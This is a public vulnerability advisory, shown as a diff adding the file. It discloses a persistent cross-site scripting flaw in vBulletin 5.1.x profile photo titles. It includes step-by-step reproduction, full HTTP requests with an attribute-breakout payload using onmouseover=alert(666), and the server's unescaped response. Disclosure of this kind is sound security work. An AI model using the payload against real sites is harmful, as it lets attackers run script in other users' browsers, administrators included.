@@ -1,0 +1,118 @@
+#Title: vBulletin 5.1.X - Cross Site Scripting
+#Date: 05.09.14
+#Version: => 5.1.2 (Latest ATM)
+#Vendor: vbulletin.com
+#Contact: smash [at] devilteam.pl
+ 
+ 
+ 1) Agenda
+ 
+Latest vBulletin forum software suffers on persistent cross site scripting vulnerability, which most likely can be used against every user, such as administrator. Vulnerability is located at user profile page and will be executed whenever someone will visit it.
+ 
+Solution - proper filtration of image title value, in this case, it's about POST title_13 parameter.
+ 
+ 
+ 2) Vulnerability
+ 
+First step to reproduce the vulnerability, is to create a user account. By then, you should visit profile of the victim.
+ 
+Let's take as example following address:
+http://vbulletin/member/2-victim
+ 
+1. Click 'Share photo' (camera icon), pick any image you like.
+ 
+2. You may add comment about photo, all you need to do is to add js payload.
+ 
+As comment, use something like - huh" onmouseover=alert(666) xss="
+ 
+Request:
+POST /ajax/render/editor_gallery_photoblock HTTP/1.1
+Host: vbulletin
+ 
+photocount=1&photos%5B0%5D%5Bfiledataid%5D=13&photos%5B0%5D%5Btitle%5D=cool%22+onmouseover%3Dalert(666)+xssed%3D%22&securitytoken=[TOKEN]
+ 
+3. Send image by clicking on 'Post' button.
+ 
+Request:
+POST /create-content/gallery HTTP/1.1
+Host: vbulletin
+Content-Type: multipart/form-data;
+boundary=---------------------------18897880557155952661558219659
+Content-Length: 1558
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="securitytoken"
+ 
+1409922799-a28bf50b7ee16f6bfc2b7c652946c366e25574d5
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="text"
+ 
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="files"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="uploadFrom"
+ 
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="filedataid[]"
+ 
+13
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="title_13"
+ 
+cool" onmouseover=alert(666) xssed="
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="uploadFrom"
+ 
+ 
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="securitytoken"
+ 
+[TOKEN]
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="parentid"
+ 
+8
+-----------------------------18897880557155952661558219659
+Content-Disposition: form-data; name="setfor"
+ 
+5
+-----------------------------18897880557155952661558219659--
+ 
+4. Done
+ 
+At this point, victim should be noticed about new activity via 'Messages' tab:
+"attacker has left you a visitor message"
+ 
+Basically, you may use this XSS against any profile.
+ 
+Now, whenever someone will visit profile of victim (ie. http://vbulletin/member/2-victim), he should notice image you uploaded. In this case, js is executed while 'onmouseover', so victim need to click on image.
+ 
+When victim will click on image, js will be executed, and popup will appear.
+ 
+Request:
+GET /filedata/gallery?nodeid=31&startIndex=0&securitytoken=[TOKEN] HTTP/1.1
+Host: vbulletin
+ 
+Response:
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+ 
+{"photos":[{"title":"cool\" onmouseover=alert(666) xssed=\"","url":"http:\/\/vbulletin\/filedata\/fetch?photoid=33","thumb":"vbulletin\/filedata\/fetch?photoid=33&thumb=1","links":"Photos By <a href=\"vbulletin\/member\/2-victim\">victim.victim@tlen.pl<\/a> in <a href=\"javascript:$('#slideshow-dialog').dialog('close');void(0);\">No Title<\/a><br \/>\n"}]}
+ 
+ 
+ 3) TL;DR
+ 
+  - Visit victim profile
+  - Upload any image
+  - XSS in title (asdf" onmouseover=alert(666) xss=")
+  - Send
